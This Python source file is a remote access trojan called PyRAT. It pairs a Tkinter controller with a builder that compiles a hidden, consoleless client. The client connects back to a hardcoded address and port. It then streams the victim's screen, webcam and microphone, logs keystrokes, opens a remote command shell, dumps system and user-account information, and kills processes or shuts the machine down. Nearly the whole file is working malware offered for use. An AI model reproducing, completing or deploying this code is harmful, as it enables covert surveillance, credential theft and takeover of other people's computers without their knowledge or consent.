import os
import threading


def requirements():
    os.system("pip install opencv-python pillow pynput win10toast pyaudio pyinstaller")


threading.Thread(target=requirements).start()
import tkinter as tk
import socket
import time
import cv2
import numpy as np
from PIL import Image, ImageTk
from tkinter import font
import io
from win10toast import ToastNotifier
import pyaudio

IP = "0.0.0.0"
listen = False
server_thread = None


class PyRAT:

    def __init__(self, master):
        self.root = master
        self.root.title("PyRAT by ZeyTroX")
        self.root.iconbitmap("Snake.ico")
        self.root.geometry("1080x730")
        self.root.configure(bg="black")

        self.root.resizable(
            width=False,
            height=False
        )

        self.img = (ImageTk.PhotoImage(Image.open("Snake.ico").resize((100, 100))))

        self.custom_font = font.Font(
            family="Helvetica",
            size=20,
            weight="bold"
        )

        self.small_font = font.Font(
            family="Helvetica",
            size=9,
            weight="bold"
        )

        self.MyLabel = tk.Label(
            self.root,
            bg="black",
            fg="lime",
            text="PyRAT",
            font=self.custom_font
        )

        self.ImageLabel = tk.Label(
            self.root,
            image=self.img,
            bg="black"
        )

        self.NeedsLabel = tk.Label(
            self.root,
            text="PORT:",
            bg="black",
            fg="lime",
            font=self.small_font
        )

        self.PortEntry = tk.Entry(
            self.root,
            width=13,
            bg="black",
            fg="green",
            font=self.small_font
        )

        self.Listen = tk.Button(
            self.root,
            text="start listening",
            command=self.switch_listening,
            width=12,
            bg="black",
            fg="lime",
            font=self.small_font
        )

        self.getInfo = tk.Button(
            self.root,
            text="Info",
            width=15,
            bg="black",
            fg="lime",
            font=self.small_font,
            command=self.info
        )

        self.getDesktop = tk.Button(
            self.root,
            text="Screen",
            width=15,
            bg="black",
            fg="lime",
            font=self.small_font,
            command=self.screen
        )

        self.getCam = tk.Button(
            self.root,
            text="Cam",
            width=15,
            bg="black",
            fg="lime",
            font=self.small_font,
            command=self.cam
        )

        self.getShell = tk.Button(
            self.root,
            text="Shell",
            width=15,
            bg="black",
            fg="lime",
            font=self.small_font,
            command=self.toggle_shell
        )

        self.listeningLabel = tk.Label(
            self.root,
            fg="white",
            bg="black",
            font=self.small_font
        )

        self.connectionLabel = tk.Label(
            self.root,
            bg="black",
            fg="lime",
            font=self.small_font
        )

        self.ErrorLabel = tk.Label(
            self.root,
            bg="black",
            fg="red",
            font=self.small_font
        )

        self.Display = tk.Text(
            self.root,
            bg="black",
            fg="white",
            font=self.small_font,
            width=130,
            height=40,
            state="disabled"
        )

        self.sendEntry = tk.Entry(
            self.root,
            bg="black",
            fg="white",
            font=self.small_font,
            width=25,
            state="readonly"
        )

        self.InputLabel = tk.Label(
            self.root,
            bg="black",
            fg="white",
            font=self.small_font,
            text="Input:"
        )

        self.Build = tk.Button(
            self.root,
            bg="black",
            fg="lime",
            text="Build",
            font=self.small_font,
            width=12,
            command=self.builder
        )

        self.BuildPort = tk.Entry(
            self.root,
            width=13,
            bg="black",
            fg="green",
            font=self.small_font
        )

        self.BuildIp = tk.Entry(
            self.root,
            width=13,
            bg="black",
            fg="green",
            font=self.small_font
        )

        self.BuilderLabel = tk.Label(
            self.root,
            fg="lime",
            bg="black",
            font=self.small_font,
            text="IP/PORT:"
        )

        self.Audio = tk.Button(
            self.root,
            text="Audio",
            width=15,
            bg="black",
            fg="lime",
            font=self.small_font,
            command=self.audio
        )

        self.getLogs = tk.Button(
            self.root,
            text="Logger",
            width=15,
            bg="black",
            fg="lime",
            font=self.small_font,
            command=self.logger
        )

        self.shutdown = tk.Button(
            self.root,
            text="Shutdown",
            width=15,
            bg="black",
            fg="lime",
            font=self.small_font,
            command=self.shutdown
        )

        self.restart = tk.Button(
            self.root,
            text="Restart",
            width=15,
            bg="black",
            fg="lime",
            font=self.small_font,
            command=self.restart
        )

        self.lock = tk.Button(
            self.root,
            text="Lock",
            width=15,
            bg="black",
            fg="lime",
            font=self.small_font,
            command=self.lock
        )

        self.screenshot = tk.Button(
            self.root,
            text="Screenshot",
            width=15,
            bg="black",
            fg="lime",
            font=self.small_font,
            command=self.screenshot
        )

        self.snap = tk.Button(
            self.root,
            text="Snap",
            width=15,
            bg="black",
            fg="lime",
            font=self.small_font,
            command=self.snap
        )

        self.kill = tk.Button(
            self.root,
            text="Kill",
            width=15,
            bg="black",
            fg="lime",
            font=self.small_font,
            command=self.toggle_kill
        )

        self.kill_entry = tk.Entry(
            self.root,
            bg="black",
            fg="white",
            font=self.small_font,
            width=25,
            state="readonly"
        )

        self.kill_label = tk.Label(
            self.root,
            bg="black",
            fg="white",
            font=self.small_font,
            text="PID:"
        )

        self.img_label = tk.Label(self.root)
        self.sendEntry.bind("<Return>", self.shell)
        self.kill_entry.bind("<Return>", self.killer)

        self.shutdown.place(x=500, y=680)
        self.restart.place(x=620, y=680)
        self.lock.place(x=140, y=680)
        self.screenshot.place(x=260, y=680)
        self.snap.place(x=380, y=680)
        self.kill.place(x=740, y=680)
        self.ImageLabel.place(x=20, y=10)
        self.NeedsLabel.place(x=20, y=170)
        self.PortEntry.place(x=20, y=190)
        self.MyLabel.place(x=20, y=120)
        self.getInfo.place(x=140, y=650)
        self.getDesktop.place(x=260, y=650)
        self.getCam.place(x=380, y=650)
        self.getShell.place(x=740, y=650)
        self.listeningLabel.place(x=20, y=238)
        self.connectionLabel.place(x=925, y=2)
        self.ErrorLabel.place(x=20, y=680)
        self.Display.place(x=140, y=20)
        self.Build.place(x=20, y=340)
        self.BuildPort.place(x=20, y=320)
        self.Listen.place(x=20, y=210)
        self.getLogs.place(x=620, y=650)
        self.BuilderLabel.place(x=20, y=277)
        self.BuildIp.place(x=20, y=300)
        self.Audio.place(x=500, y=650)

        self.server = None
        self.client = None
        self.sharingScreen = False
        self.sharingCam = False
        self.shell_mode = False
        self.sharingAudio = False
        self.showing_png = False
        self.showing_snap = False
        self.killer = False
        self.Logging = False

        self.size_share = None
        self.width_share = None
        self.height_share = None
        self.size_cam = None
        self.width_cam = None
        self.height_cam = None

    def logger(self):
        def stop_logging():
            try:
                self.client.send("<STOP_LOG>".encode())
                self.clear()
                self.enable()
            except ConnectionAbortedError:
                self.enable()
                self.connectionLabel.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.connectionLabel.configure(text="")
                pass

        def start_logging():
            try:
                self.client.send("<LOG>".encode())
                self.clear()
                self.disable()
                self.getLogs.configure(text="exit", state="normal")
                while self.Logging:
                    key = self.client.recv(1024).decode(errors="ignore")
                    if "<END_LOG>" in key or not key:
                        self.Logging = False
                        break
                    self.Display.configure(state="normal")
                    self.Display.insert(tk.END, f"{key}")
                    self.Display.yview_moveto(1)
                    self.Display.configure(state="disabled")

            except ConnectionResetError:
                self.Logging = False
                self.enable()
                self.connectionLabel.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.Logging = False
                self.enable()
                self.connectionLabel.configure(text="")
                pass

        if not self.Logging:
            self.Logging = True
            threading.Thread(target=start_logging).start()
        else:
            self.Logging = False
            threading.Thread(target=stop_logging).start()

    def notify(self, title, msg, duration):
        notify = ToastNotifier()
        notify.show_toast(
            title=title,
            msg=msg,
            icon_path=r"C:\Users\thoma\PycharmProjects\pythonProject\Snake.ico",
            duration=duration
        )

    def snap(self):
        def stop_showing():
            self.enable()
            self.img_label.place_forget()

        def get():
            try:
                self.client.send("<SNAP>".encode())
                state = self.client.recv(4096)
                if state == b"<START>":
                    self.disable()
                    self.snap.configure(text="exit", state="normal")
                    self.clear()
                    img_bytes = b""
                    while True:
                        bytes = self.client.recv(10240)
                        if b"<END>" in bytes:
                            bytes = bytes.replace(b"<END>", b"")
                            img_bytes += bytes
                            break
                        img_bytes += bytes

                    image = ImageTk.PhotoImage(Image.open(io.BytesIO(img_bytes)).resize((920, 600)))
                    self.img_label.configure(image=image)
                    self.img_label.image = image
                    self.img_label.place(x=140, y=20)
                    while self.showing_snap:
                        continue
                elif state == b"<NO_CAM>":
                    self.enable()
                    self.ErrorLabel.configure(text="No cam found!")

            except ConnectionResetError:
                self.enable()
                self.connectionLabel.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.connectionLabel.configure(text="")
                pass
            except OSError:
                self.enable()
                pass

        if not self.showing_snap:
            self.showing_snap = True
            threading.Thread(target=get).start()
        else:
            self.showing_snap = False
            threading.Thread(target=stop_showing).start()

    def screenshot(self):
        def stop_showing():
            self.enable()
            self.img_label.place_forget()

        def get():
            try:
                self.client.send("<SCREENSHOT>".encode())
                self.disable()
                time.sleep(0.01)
                self.screenshot.configure(text="exit", state="normal")
                img_bytes = b""
                while True:
                    bytes = self.client.recv(4096)
                    if b"<END>" in bytes:
                        bytes = bytes.replace(b"<END>", b"")
                        img_bytes += bytes
                        break
                    img_bytes += bytes

                image = ImageTk.PhotoImage(Image.open(io.BytesIO(img_bytes)).resize((920, 600)))
                self.img_label.configure(image=image)
                self.img_label.place(x=140, y=20)
                self.clear()
                while self.showing_png:
                    continue

            except ConnectionResetError:
                self.enable()
                self.connectionLabel.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.connectionLabel.configure(text="")
                pass
            except OSError:
                self.enable()
                pass

        if not self.showing_png:
            self.showing_png = True
            threading.Thread(target=get).start()
        else:
            self.showing_png = False
            threading.Thread(target=stop_showing).start()

    def restart(self):
        try:
            self.client.send("<RESTART>".encode())
            self.connectionLabel.configure(text="")
            if self.client:
                self.client.close()
            self.client = None
        except ConnectionResetError:
            self.connectionLabel.configure(text="")
            self.client = None
            pass
        except AttributeError:
            self.connectionLabel.configure(text="")
            pass

    def shutdown(self):
        try:
            self.client.send("<SHUTDOWN>".encode())
            self.connectionLabel.configure(text="")
            if self.client:
                self.client.close()
            self.client = None
        except ConnectionResetError:
            self.connectionLabel.configure(text="")
            self.client = None
            pass
        except AttributeError:
            self.connectionLabel.configure(text="")
            pass

    def lock(self):
        try:
            self.client.send("<LOCK>".encode())
        except ConnectionResetError:
            self.connectionLabel.configure(text="")
            self.client = None
            pass
        except AttributeError:
            self.connectionLabel.configure(text="")
            pass

    def enable(self):
        self.getInfo.configure(state="normal", text="Info")
        self.getCam.configure(state="normal", text="Cam")
        self.getLogs.configure(state="normal", text="Logger")
        self.getShell.configure(state="normal", text="Shell")
        self.getDesktop.configure(state="normal", text="Screen")
        self.Audio.configure(state="normal", text="Audio")
        self.kill.configure(state="normal", text="Kill")
        self.snap.configure(state="normal", text="Snap")
        self.lock.configure(state="normal", text="Lock")
        self.restart.configure(state="normal", text="Restart")
        self.shutdown.configure(state="normal", text="Shutdown")
        self.screenshot.configure(state="normal", text="Screenshot")
        self.ErrorLabel.configure(text="")
        self.showing_png = False
        self.showing_snap = False
        self.sharingScreen = False
        self.sharingCam = False
        self.sharingAudio = False

    def disable(self):
        self.getInfo.configure(state="disabled")
        self.getCam.configure(state="disabled")
        self.getLogs.configure(state="disabled")
        self.getShell.configure(state="disabled")
        self.getDesktop.configure(state="disabled")
        self.Audio.configure(state="disabled")
        self.kill.configure(state="disabled")
        self.snap.configure(state="disabled")
        self.lock.configure(state="disabled")
        self.restart.configure(state="disabled")
        self.shutdown.configure(state="disabled")
        self.screenshot.configure(state="disabled")
        self.ErrorLabel.configure(text="")

    def killer(self, event):
        try:
            task = self.kill_entry.get().strip()
            if task.isdigit():
                self.client.send("<KILLED>".encode())
                self.client.send(task.encode())
                self.ErrorLabel.configure(text="")
                self.kill_entry.delete("0", "end")
                output = self.client.recv(2048).decode(errors="ignore")
                if output == "None":
                    self.kill_entry.delete("0", "end")
                    self.ErrorLabel.configure(text="Enter valid PID!")
                else:
                    self.ErrorLabel.configure(text="")
                    self.Display.configure(state="normal")
                    self.Display.insert(tk.END, f"\n{output}")
                    self.Display.yview_moveto(1)
                    self.Display.configure(state="disabled")
            else:
                self.kill_entry.delete("0", "end")
                self.ErrorLabel.configure(text="Enter valid PID!")

        except ConnectionResetError:
            self.enable()
            self.connectionLabel.configure(text="")
            self.client = None
            pass
        except AttributeError:
            self.enable()
            self.connectionLabel.configure(text="")
            pass

    def toggle_kill(self):
        try:
            if not self.killer and self.client:
                def start():
                    self.killer = True
                    self.disable()
                    self.clear()
                    self.client.send("<KILL>".encode())
                    out = self.client.recv(20480).decode(errors="ignore")
                    self.Display.configure(state="normal")
                    self.Display.delete("1.0", tk.END)
                    self.Display.insert("1.0", out)
                    self.Display.yview_moveto(1)
                    self.Display.configure(state="disabled")
                    self.kill_label.place(x=875, y=660)
                    self.kill.configure(state="normal", text="exit")
                    self.kill_entry.configure(state="normal")
                    self.kill_entry.place(x=875, y=682)
                threading.Thread(target=start).start()

            else:
                def stop():
                    self.killer = False
                    self.Display.delete("1.0", tk.END)
                    self.kill_entry.place_forget()
                    self.kill_label.place_forget()
                    self.enable()
                    self.clear()
                    self.kill_entry.delete("0", "end")
                    self.kill_entry.configure(state="readonly")

                threading.Thread(target=stop).start()

        except ConnectionResetError:
            self.enable()
            self.connectionLabel.configure(text="")
            self.client = None
            pass
        except AttributeError:
            self.enable()
            self.connectionLabel.configure(text="")
            pass

    def info(self):
        def getinfo():
            try:
                self.disable()
                self.client.send("<INFO>".encode())
                output = self.client.recv(10240).decode(errors="ignore")
                self.Display.configure(state="normal")
                self.Display.delete("1.0", tk.END)
                self.Display.insert(tk.END, output)
                self.Display.configure(state="disabled")
                self.enable()
            except ConnectionResetError:
                self.enable()
                self.connectionLabel.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.connectionLabel.configure(text="")
                pass

        threading.Thread(target=getinfo).start()

    def audio(self):
        def stop_audio():
            try:
                self.sharingAudio = False
                self.client.send("<STOP_AUDIO>".encode())
                while True:
                    state = self.client.recv(1024)
                    if b"<ENDED>" in state:
                        break
                self.enable()
            except ConnectionResetError:
                self.enable()
                self.connectionLabel.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.connectionLabel.configure(text="")
                pass

        def share():
            try:
                self.client.send("<AUDIO>".encode())
                self.sharingAudio = True
                self.clear()
                rec = pyaudio.PyAudio()
                aud = rec.open(format=pyaudio.paInt16, channels=1, rate=44100, frames_per_buffer=1024, output=True)
                self.disable()
                self.Audio.configure(text="exit", state="normal")
                while self.sharingAudio:
                    data = self.client.recv(1024)
                    if not data:
                        break
                    aud.write(data)
                self.enable()
                self.client.send("<STOP_AUDIO>".encode())

            except ConnectionResetError:
                self.enable()
                self.connectionLabel.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.connectionLabel.configure(text="")
                pass

        if not self.sharingAudio:
            threading.Thread(target=share).start()
        else:
            threading.Thread(target=stop_audio).start()

    def screen(self):
        def stop_share():
            try:
                self.client.send("<STOP_SHARE>".encode())
                while True:
                    state = self.client.recv(20480)
                    if b"<STOPPED>" in state:
                        break
                self.enable()
            except ConnectionResetError:
                self.enable()
                self.connectionLabel.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.connectionLabel.configure(text="")
                pass

        def share():
            try:
                self.client.send("<SHARE>".encode())
                self.disable()
                self.clear()
                self.getDesktop.configure(text="exit", state="normal")
                while self.sharingScreen:
                    data = b""
                    while len(data) < self.size_share:
                        packet = self.client.recv(self.size_share - len(data))
                        if not packet:
                            break
                        data += packet
                    if not data:
                        break

                    img = np.frombuffer(data, dtype=np.uint8).reshape(self.height_share, self.width_share, 3)
                    screenshot = cv2.resize(cv2.cvtColor(img, cv2.COLOR_BGR2RGB), (920, 600))
                    cv2.imshow("Screen", screenshot)
                    cv2.waitKey(1)
                cv2.destroyAllWindows()

            except ConnectionResetError:
                self.enable()
                self.connectionLabel.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.connectionLabel.configure(text="")
                pass

        if not self.sharingScreen:
            self.sharingScreen = True
            threading.Thread(target=share).start()
        else:
            self.sharingScreen = False
            threading.Thread(target=stop_share).start()

    def recv_stats(self):
        def recv_share_stats():
            self.width_share, self.height_share, self.size_share = map(int, self.client.recv(4096).decode().split(','))

        def recv_cam_stats():
            self.width_cam, self.height_cam, self.size_cam = map(int, self.client.recv(4096).decode().split(','))

        self.client.send("<STATS>".encode())
        recv_share_stats()
        recv_cam_stats()

    def cam(self):
        def stop_cam():
            try:
                self.enable()
                self.client.send("<STOP_CAM>".encode())
                while True:
                    state = self.client.recv(20480)
                    if b"<STOPPED>" in state:
                        break

            except ConnectionResetError:
                self.enable()
                self.connectionLabel.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.connectionLabel.configure(text="")
                pass
            except OSError:
                self.enable()
                self.connectionLabel.configure(text="")
                self.client = None
                pass

        def share():
            try:
                self.client.send("<CAM>".encode())
                state = self.client.recv(4096)
                if state == b"<START>":
                    self.disable()
                    self.clear()
                    self.getCam.configure(text="exit", state="normal")
                    while self.sharingCam:
                        data = b""
                        while len(data) < self.size_cam:
                            packet = self.client.recv(self.size_cam - len(data))
                            if not packet:
                                break
                            data += packet
                        if not data:
                            self.sharingCam = False
                            break
                        img = np.frombuffer(data, dtype=np.uint8).reshape((self.width_cam, self.height_cam, 3))
                        image = cv2.resize(img, (920, 600))
                        cv2.imshow("Camera", image)
                        cv2.waitKey(1)

                    cv2.destroyAllWindows()
                elif state == b"<NO_CAM>":
                    self.enable()
                    self.ErrorLabel.configure(text="No cam found!")

            except ConnectionResetError:
                self.enable()
                self.connectionLabel.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.connectionLabel.configure(text="")
                pass
            except ValueError:
                self.enable()

        if not self.sharingCam:
            self.sharingCam = True
            threading.Thread(target=share).start()
        else:
            self.sharingCam = False
            threading.Thread(target=stop_cam).start()

    def start_server(self, port):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.server.bind((str(IP), int(port)))
            self.server.listen()

            while listen:
                self.client, addr = self.server.accept()

                if self.client:
                    if self.client.recv(1024).decode() == "<PyRAT>":
                        self.client.send("<PyRAT>".encode())
                        self.recv_stats()
                        self.connectionLabel.configure(text=f"Connected: {addr[0]}", font=self.small_font)
                        threading.Thread(target=self.notify, args=("New connection!", f"Connected to {addr[0]}", 1)).start()
                    else:
                        self.client.close()
                        self.client = None
                        self.connectionLabel.configure(text="")

        except:
            pass

    def switch_listening(self):
        global listen
        global server_thread
        listen = not listen
        time.sleep(0.01)

        if listen:
            try:
                port = int(self.PortEntry.get().strip())

                if port is None or port > 65535:
                    raise ValueError()

                else:
                    self.ErrorLabel.configure(text="")
                    self.PortEntry.configure(state="disabled")
                    self.Listen.configure(text="stop listening")
                    server_thread = threading.Thread(target=self.start_server, args=(port,))
                    server_thread.start()
                    self.listeningLabel.configure(text=f" Listening...")

            except ValueError:
                self.enable()
                self.ErrorLabel.configure(text="Enter valid port!")
                self.listeningLabel.configure(text="")
                listen = False
                pass
            except ConnectionResetError:
                self.enable()
                self.connectionLabel.configure(text="")
                listen = False
                self.listeningLabel.configure(text="")
                pass
        else:
            try:
                self.connectionLabel.configure(text="")
                self.PortEntry.configure(state="normal")
                self.enable()
                self.size_share = None
                self.width_share = None
                self.height_share = None
                self.size_cam = None
                self.width_cam = None
                self.height_cam = None

                self.Listen.configure(text="start listening")
                self.listeningLabel.configure(text="")
                self.clear()
                if self.client:
                    self.client.send("<END>".encode())
                self.server.close()
                self.server = None
                if self.client:
                    self.client.close()
                if server_thread and server_thread.is_alive():
                    server_thread.join()

                self.client = None
            except ConnectionResetError:
                self.enable()
                self.connectionLabel.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.connectionLabel.configure(text="")
                pass

    def clear(self):
        self.Display.configure(state="normal")
        self.Display.delete("1.0", tk.END)
        self.Display.configure(state="disabled")

    def shell(self, event):
        def send():
            try:
                if self.client and self.shell_mode:
                    command = self.sendEntry.get().strip()

                    if command.lower() == "exit":
                        self.toggle_shell()
                        return

                    elif not command.strip() or command.strip() == "<END_SHELL>":
                        command = "nothing"

                    self.Display.configure(state="normal")
                    self.client.send(command.encode())
                    direct = self.client.recv(2048).decode(errors="ignore")
                    self.Display.insert(tk.END, f"{direct}> {command}\n")
                    self.Display.configure(state="disabled")
                    self.sendEntry.delete("0", "end")
                    out = self.client.recv(12288).decode(errors="ignore")
                    self.Display.configure(state="normal")
                    self.Display.insert(tk.END, f"{out}\n\n")
                    self.Display.yview_moveto(1)
                    self.Display.configure(state="disabled")

                else:
                    self.toggle_shell()
            except ConnectionResetError:
                self.enable()
                self.connectionLabel.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.connectionLabel.configure(text="")
                pass

        threading.Thread(target=send).start()

    def toggle_shell(self):
        try:
            self.shell_mode = not self.shell_mode
            if self.shell_mode and self.client:
                self.clear()
                self.disable()
                self.sendEntry.configure(state="normal")
                self.getShell.configure(text="exit", state="normal")
                self.sendEntry.place(x=875, y=652)
                self.InputLabel.place(x=875, y=630)
                self.client.send("<SHELL>".encode())
            else:
                self.clear()
                self.enable()
                self.sendEntry.place_forget()
                self.InputLabel.place_forget()
                self.sendEntry.delete("0", "end")
                self.sendEntry.configure(state="readonly")
                self.client.send("<END_SHELL>".encode())
        except ConnectionResetError:
            self.enable()
            self.connectionLabel.configure(text="")
            self.client = None
            pass
        except AttributeError:
            self.enable()
            self.connectionLabel.configure(text="")
            pass

    def builder(self):
        try:
            ip = self.BuildIp.get().strip()
            port = int(self.BuildPort.get().strip())

            if ip is None or len(ip) < 6:
                raise ZeroDivisionError

            elif port is None or port > 65535:
                raise ValueError()

            def build():
                program = f"""
import os
import subprocess
import threading
import socket
import time
import numpy as np
import io
from PIL import ImageGrab, Image
import cv2
from pynput import keyboard
import pyaudio

IP = "10.0.0.246"
PORT = 4444

local_shell = False
connected = False
cam = False
stream = False
times = 0
Logging = False
rec_audio = False


def audio(client):
    global rec_audio
    try:
        rec = pyaudio.PyAudio()
        aud = rec.open(format=pyaudio.paInt16, channels=1, rate=44100, frames_per_buffer=1024, input=True)

        while rec_audio:
            data = aud.read(1024)
            client.sendall(data)

        client.send(b"<ENDED>")

    except ConnectionResetError:
        rec_audio = False
        if client:
            client.close()
        pass

    except OSError:
        rec_audio = False
        pass

    finally:
        if aud.is_active():
            aud.stop_stream()
        aud.close()
        rec.terminate()


def log(client):
    global Logging

    def on_press(key):
        try:
            client.send(key.char.encode())
        except AttributeError:
            special = str(key).replace("Key.", "")
            if special == "space":
                client.send(" ".encode())
            elif special == "tab":
                client.send("    ".encode())
            elif special == "enter":
                client.send("{r"\n"}".encode())
            elif special == "backspace":
                client.send(" <BACKSPACE> ".encode())
            elif special == "caps_lock":
                client.send(" <CAPS_LOCK> ".encode())


        except ConnectionResetError:
            global Logging
            if client:
                client.close()
            Logging = False
            pass

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    while Logging:
        pass

    listener.stop()
    listener.join()
    client.send("<END_LOG>".encode())


def send_stats(client):
    def send_share_stats():
        img = ImageGrab.grab()
        res = img.size
        size = len(np.array(img).tobytes())
        client.send(f"{"{res[0]},{res[1]},{size}"}".encode())
        img.close()

    def send_cam_stats():
        camera = cv2.VideoCapture(0)
        if camera.isOpened():
            _, frame = camera.read()
            camera.release()
            res = frame.shape
            size = len(frame.tobytes())
            client.send(f"{"{res[0]},{res[1]},{size}"}".encode())
        else:
            client.send("0,0,0".encode())
        camera.release()

    send_share_stats()
    send_cam_stats()


def share_desktop(client):
    global connected
    global stream
    try:
        while stream:
            frame = ImageGrab.grab()
            img_bytes = np.array(frame).tobytes()
            client.sendall(img_bytes)
        client.send(b"<STOPPED>")
    except ConnectionResetError:
        if client:
            client.close()
        stream = False
        connected = False
        pass


def share_cam(client):
    global connected
    global cam
    try:
        data = cv2.VideoCapture(0)
        if data.isOpened():
            client.send(b"<START>")
            while cam:
                success, frame = data.read()
                img_bytes = frame.tobytes()
                client.sendall(img_bytes)
            data.release()
            client.send(b"<STOPPED>")
        else:
            data.release()
            client.send(b"<NO_CAM>")

    except ConnectionResetError:
        if client:
            client.close()
        cam = False
        connected = False
        pass
    except AttributeError:
        cam = False
        pass


def snap(client):
    global connected
    try:
        snap = cv2.VideoCapture(0)
        if snap.isOpened():
            client.send(b"<START>")
            success, frame = snap.read()
            snap.release()
            image = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))

            buffer = io.BytesIO()
            image.save(buffer, "PNG")
            img_bytes = buffer.getvalue()
            client.sendall(img_bytes)
            client.send(b"<END>")
        else:
            snap.release()
            client.send(b"<NO_CAM>")

    except ConnectionResetError:
        if client:
            client.close()
        connected = False
        pass


def screenshot(client):
    global connected
    try:
        img = ImageGrab.grab()

        buffer = io.BytesIO()
        img.save(buffer, "PNG")
        img_bytes = buffer.getvalue()

        client.sendall(img_bytes)
        client.send(b"<END>")
        img.close()

    except ConnectionResetError:
        if client:
            client.close()
        connected = False
        pass


def shell(client):
    global local_shell
    global connected
    while local_shell:
        try:
            command = client.recv(4096).decode(errors="ignore").strip()

            if command == "<END_SHELL>":
                local_shell = False
                return
            elif command == "<END>":
                local_shell = False
                connected = False
                return

            else:
                try:
                    client.send(os.getcwd().encode())
                    if command.startswith("cd "):
                        try:
                            os.chdir(command[3:])
                            output = f">>'{r"{os.getcwd()}\\"}'<<"
                        except FileNotFoundError:
                            output = "Directory not found!"
                        except PermissionError:
                            output = "Access denied!"

                    elif command.lower() == "cmd" or command.lower() == "powershell":
                        output = "Operation not permitted!"

                    else:
                        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode(
                            errors="ignore")

                except subprocess.CalledProcessError as e:
                    output = e.output.decode(errors="ignore")

                client.send(output.encode())
                time.sleep(0.1)

        except ConnectionResetError:
            if client:
                client.close()
            client = None
            connected = False
            local_shell = False
            pass

        except AttributeError:
            client = None
            connected = False
            local_shell = False
            pass


def recv():
    global connected
    global client
    while True:
        while not connected:
            client = None
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.connect((str(IP), int(PORT)))
                client.send("<PyRAT>".encode())
                if client.recv(1024).decode() == "<PyRAT>":
                    connected = True

                else:
                    client.close()
                time.sleep(3)
            except ConnectionResetError:
                time.sleep(3)
            except ConnectionRefusedError:
                time.sleep(3)

        try:
            global times
            command = client.recv(4096).decode()

            if command == "<STATS>":
                threading.Thread(target=send_stats, args=(client,)).start()

            elif command == "<INFO>":
                info = subprocess.check_output("wmic cpu get name,NumberOfCores,NumberOfLogicalProcessors", shell=True)
                info += subprocess.check_output("wmic memorychip get capacity,Speed", shell=True)
                info += subprocess.check_output("wmic diskdrive get model,size", shell=True)
                info += subprocess.check_output("systeminfo", shell=True)
                info += subprocess.check_output("net user", shell=True)
                info += subprocess.check_output("ipconfig", shell=True)
                client.sendall(info)

            elif command == "<CAM>":
                global cam
                cam = True
                threading.Thread(target=share_cam, args=(client,)).start()

            elif command == "<SNAP>":
                snap(client)

            elif command == "<SCREENSHOT>":
                screenshot(client)

            elif command == "<SHARE>":
                global stream
                stream = True
                threading.Thread(target=share_desktop, args=(client,)).start()

            elif command == "<AUDIO>":
                global rec_audio
                rec_audio = True
                threading.Thread(target=audio, args=(client,)).start()

            elif command == "<SHELL>":
                global local_shell
                local_shell = True
                shell(client)

            elif command == "<STOP_AUDIO>":
                rec_audio = False

            elif command == "<LOG>":
                global Logging
                Logging = True
                threading.Thread(target=log, args=(client,)).start()

            elif command == "<STOP_LOG>":
                Logging = False

            elif command == "<STOP_CAM>":
                cam = False

            elif command == "<STOP_SHARE>":
                stream = False

            elif command == "<END>":
                client.close()
                connected = False
                client = None
                local_shell = False
                connected = False
                cam = False
                stream = False
                Logging = False
                rec_audio = False

            elif command == "<SHUTDOWN>":
                os.system("shutdown /s /t 0")

            elif command == "<RESTART>":
                os.system("shutdown /r /t 0")

            elif command == "<LOCK>":
                os.system("rundll32.exe user32.dll,LockWorkStation")

            elif command == "<KILL>":
                out = subprocess.check_output("tasklist", shell=True).decode(errors="ignore")
                client.sendall(out.encode())
                pass

            elif command == "<KILLED>":
                PID = client.recv(1024).decode()
                out = subprocess.check_output(f"taskkill /F /PID {r"PID"}")
                client.send(out)

            else:
                pass

        except subprocess.CalledProcessError:
            client.send("None".encode())

        except ConnectionResetError:
            if client:
                client.close()
            client = None
            connected = False
            time.sleep(3)
            pass

        except AttributeError:
            if client:
                client.close()
            client = None
            connected = False
            time.sleep(3)
            pass

        except UnboundLocalError:
            if client:
                client.close()
            client = None
            connected = False
            time.sleep(3)
            pass


try:
    recv()
except:
    recv()
                """

                self.ErrorLabel.configure(text="")
                self.BuildIp.delete("0", "end")
                self.BuildPort.delete("0", "end")
                ready = open("ready.py", "w")
                ready.write(program)
                ready.close()
                os.system("pyinstaller --onefile --noconsole ready.py")
                os.remove("ready.py")

            threading.Thread(target=build).start()

        except ValueError:
            self.ErrorLabel.configure(text="Enter valid port!")
        except ZeroDivisionError:
            self.ErrorLabel.configure(text="Enter valid ip!")


if __name__ == '__main__':
    try:
        root = tk.Tk()
        PyRAT(root)
        root.mainloop()

    except:
        pass
